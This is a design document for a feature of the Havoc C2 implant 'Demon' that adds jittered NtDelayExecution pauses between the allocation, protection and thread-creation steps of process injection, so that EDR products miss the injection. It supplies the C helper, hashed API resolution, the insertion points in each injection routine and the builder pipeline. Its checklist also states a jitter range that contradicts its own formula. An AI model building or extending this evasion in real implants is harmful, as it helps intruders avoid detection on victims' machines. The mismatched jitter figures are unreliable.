# HVC-046 — Injection Execution Delay

**Status:** Implemented  
**Component:** Demon agent (C), Teamserver (Go), Client (C++)

---

## Problem Statement

Modern EDRs and memory forensics tools correlate the tight temporal sequence of:
```
VirtualAllocEx → VirtualProtectEx → CreateRemoteThread
```
This three-event sequence occurring within milliseconds is a high-confidence injection
signature. The gap between allocation and execution is zero in the base Demon injection path,
making the pattern trivially detectable by temporal correlation heuristics in tools like
Process Hacker, PE-sieve, Elastic EDR, and CrowdStrike Falcon.

Introducing configurable, jittered delays between those stages dissociates the events in
time — spreading them across multiple scan windows and breaking the heuristic — without
changing the API surface or requiring additional techniques.

---

## Design Rationale

Two new integer config fields are appended at the end of the existing blob, preserving full
backward compatibility: older Demon builds that stop parsing at the last field they know
will simply not read ExecDelay and behave exactly as before.

- **ExecDelay = 0 (default):** `ExecDelaySleep()` is a single `if (!Base) return;` — zero
  overhead, zero observable effect on injection speed.
- **ExecDelay > 0:** A jittered NtDelayExecution call is inserted after allocation and after
  protect-change, delaying each stage by `Base ± (Base × Jitter% / 100)` milliseconds.

`NtDelayExecution` is used rather than `WaitForSingleObjectEx` or `Sleep` because:
- It accepts a relative negative `LARGE_INTEGER` (100-nanosecond units) — precise and
  standard.
- It is not EDR-hooked (not a security-sensitive call, no known detours).
- No handle is required.
- It is compatible with all Demon build modes (EXE, DLL, SHELLCODE, Service).

---

## Config Field Table

| Field | Type | Default | Blob position | Meaning |
|-------|------|---------|---------------|---------|
| `ExecDelay` | DWORD (ms) | 0 | 25 (0-indexed after InjectSpoofOffset) | Base delay between injection stages; 0 = disabled |
| `ExecDelayJitter` | DWORD (%) | 0 | 26 | Jitter ± percentage applied to ExecDelay; 0 = no jitter |

Effective delay per call: `Base ± (Base × Jitter% / 100)`, clamped to ≥ 1 ms when nonzero.

**LARGE_INTEGER encoding for NtDelayExecution:**
```
Li.QuadPart = -(Ms * 10000LL);  // relative time; 1ms = -10000 (100-ns units)
```
Negative value = relative time from now. Positive = absolute time (not used here).

---

## Delay Helper — ExecDelaySleep()

```c
/* Jittered NtDelayExecution pause between injection stages.
 * No-ops when ExecDelay == 0. Same jitter model as SharedSleep. */
VOID ExecDelaySleep( VOID )
{
    LARGE_INTEGER Li    = { 0 };
    ULONG         Base  = Instance->Config.Implant.ExecDelay;
    ULONG         Ji    = Instance->Config.Implant.ExecDelayJitter;
    ULONG         Range = 0;
    ULONG         Ms    = 0;

    if ( !Base ) return;

    Ms = Base;
    if ( Ji > 0 ) {
        Range = ( Base * Ji ) / 100;
        if ( Range > 0 )
            Ms = ( Base - Range / 2 ) + ( RandomNumber32() % Range );
        if ( Ms < 1 ) Ms = 1;
    }

    /* NtDelayExecution: negative LARGE_INTEGER = relative time in 100-ns units */
    Li.QuadPart = -( (LONGLONG)Ms * 10000LL );
    Instance->Win32.NtDelayExecution( FALSE, &Li );
}
```

**Jitter math:** For `Base=3000ms`, `Jitter=20%`:
- `Range = 3000 * 20 / 100 = 600`
- `Ms = (3000 - 300) + (rand % 600) = 2700..3299`
- Effective range: 2700ms..3299ms (~±10% around Base)

The formula produces a uniform distribution over `[Base - Range/2, Base + Range/2)`.
`Ms >= 1` clamp prevents zero-delay when jitter exceeds the base.

---

## NtDelayExecution Win32 Table Entry

Not previously in the Win32 function table. Added via the standard pipeline:

1. **DJB2 hash** (verified with `djb2_upper("NtDelayExecution")` Python script):
   ```
   H_FUNC_NTDELAYEXECUTION = 0xf5a936aa
   ```
2. `WIN_FUNC(NtDelayExecution)` in the ntdll block of `Demon.h`
3. Resolution in `Demon.c` ntdll block:
   ```c
   Instance->Win32.NtDelayExecution = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTDELAYEXECUTION );
   ```
4. No syscall wrapper needed — `NtDelayExecution` is not security-sensitive and is not
   EDR-hooked. Direct Win32 table call is correct and safe.

**Hash verification script (must be run before any new H_FUNC_ constant):**
```python
def djb2_upper(s):
    h = 5381
    for c in s.upper():
        h = (((h << 5) + h) + ord(c)) & 0xFFFFFFFF
    return h
```

---

## Injection Wiring Map

`ExecDelaySleep()` is inserted at **two** points per injection function: after allocation
(covers the alloc→protect gap) and after protect-change or just before execution (covers the
protect→exec gap).

| File | Function | Insertion point 1 | Insertion point 2 |
|------|----------|-------------------|-------------------|
| `src/inject/Inject.c` | `Inject()` | After `MmVirtualAlloc` success | After `MmVirtualProtect` success |
| `src/inject/Inject.c` | `DllInjectReflective()` | After `MmVirtualProtect` success | (single point; thread creation follows immediately) |
| `src/core/ObjectApi.c` | `BeaconInjectProcess()` | After first `SysNtAllocateVirtualMemory` | Before `SysNtCreateThreadEx` |
| `src/core/ObjectApi.c` | `BeaconInjectTemporaryProcess()` | After first `SysNtAllocateVirtualMemory` | Before `SysNtCreateThreadEx` |
| `src/core/Thread.c` | `ThreadCreateWoW64()` | After `MmVirtualProtect` success | (single point; thread creation follows immediately) |

---

## YAOTL → Blob → Demon Parse Chain

```
profiles/havoc.yaotl
  ExecDelay = 0          (int, optional)
  ExecDelayJitter = 0    (int, optional)
       |
       v
teamserver/pkg/profile/config.go
  ExecDelay     int  `yaotl:"ExecDelay,optional"`
  ExecDelayJitter int `yaotl:"ExecDelayJitter,optional"`
       |
       v
teamserver/pkg/common/builder/builder.go
  ConfigExecDelay     = 0
  ConfigExecDelayJitter = 0
  [read from b.config.Config["Exec Delay"]]
  [read from b.config.Config["Exec Delay Jitter"]]
  DemonConfig.AddInt(ConfigExecDelay)       /* field 25 */
  DemonConfig.AddInt(ConfigExecDelayJitter) /* field 26 */
       |
       v
client/src/UserInterface/Dialogs/Payload.cc
  "Exec Delay"       QLineEdit (default "0", reads as int ms)
  "Exec Delay Jitter" QLineEdit (default "0", reads as int %)
       |
       v
payloads/Demon/src/Demon.c  DemonConfig()
  Instance->Config.Implant.ExecDelay       = ParserGetInt32( &Parser );
  Instance->Config.Implant.ExecDelayJitter = ParserGetInt32( &Parser );
       |
       v
payloads/Demon/src/core/Win32.c  ExecDelaySleep()
  if ( !Instance->Config.Implant.ExecDelay ) return;
  ...
  Instance->Win32.NtDelayExecution( FALSE, &Li );
```

---

## Version Bump

This change adds two new config blob fields (wire-format change) → **minor bump** per
HVC-045 versioning rule:

- Teamserver: `0.9.5` → `0.9.6` (`teamserver/cmd/cmd.go`)
- Client: `1.9.1` → `1.9.2` (`client/src/global.cc`)

---

## Verification Checklist

1. Build all four Demon payload types (EXE, DLL, SHELLCODE, Service) — zero linker errors
2. Profile round-trip: set `ExecDelay = 3000` / `ExecDelayJitter = 20` in YAOTL; verify
   builder log prints the values; verify Demon debug output shows `ExecDelaySleep` firing
3. ExecDelay = 0 (default): confirm `ExecDelaySleep` is a complete no-op
4. Jitter bounds: for Base=1000, Ji=50, confirm Ms stays in range [500, 1000)
5. Config blob order: AddInt count in builder.go (27 total after this change) matches
   ParserGetInt32 count in Demon.c
6. Process monitor: inject shellcode with ExecDelay=5000ms; observe ~5s gaps between
   alloc/protect/execute events in a memory monitor
